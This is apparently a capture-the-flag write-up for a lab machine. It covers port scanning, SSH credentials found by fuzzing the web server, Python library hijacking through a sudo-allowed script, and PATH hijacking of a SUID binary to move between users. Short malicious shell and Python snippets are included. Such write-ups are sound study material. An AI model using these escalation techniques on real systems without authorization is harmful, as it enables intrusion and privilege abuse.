# Nmap
```bash
# Nmap 7.94SVN scan initiated Wed Nov 27 12:50:50 2024 as: /usr/lib/nmap/nmap -p- --min-rate=10000 --open -oG scans/quick-scan 10.10.38.61
Host: 10.10.38.61 () Status: Up
Host: 10.10.38.61 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Wed Nov 27 12:50:58 2024 -- 1 IP address (1 host up) scanned in 7.35 seconds
```

# Foothold
We access to [http://10.10.194.160/](http://10.10.194.160/) and fuzzing we discover [http://10.10.194.160/r/a/b/b/i/t/](http://10.10.194.160/r/a/b/b/i/t/) where ssh credentials are (alice:HowDothTheLittleCrocodileImproveHisShiningTail)

# Lateral movement: rabbit
With `sudo -l` we discover that we can launch `sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`

Inspecting the python script we see that we don't have write access to the script, neither we have access to the python3.6 binary or random library. With `python3 -c ‘import sys; print(sys.path)’` we can see the order where python3.6 search for the libraries and here we find that we can place a malicious library in the same folder as the script (our home folder)

![[Pasted image 20241127135908.png]]

```bash
import os
os.system("/bin/bash")
```

Save it at random.py and execute the script as rabbit, and we are rabbit

# Lateral movement: hatter
In rabbit home folder we find a binary with SUID bit set, we don't get a lot of information so we move the file with netcat to our host and inspect it with ghidra. We find that it executes command date, and we can execute date as rabbit

![[Pasted image 20241127143822.png]]

We can create a date malicious binary and modify the path to execute the bad binary

```bash
#!/bin/bash
/bin/bash
```
`export PATH=/tmp:$PATH`

![[Pasted image 20241127144435.png]]

Execute the teaParty binary and get a shell as hatter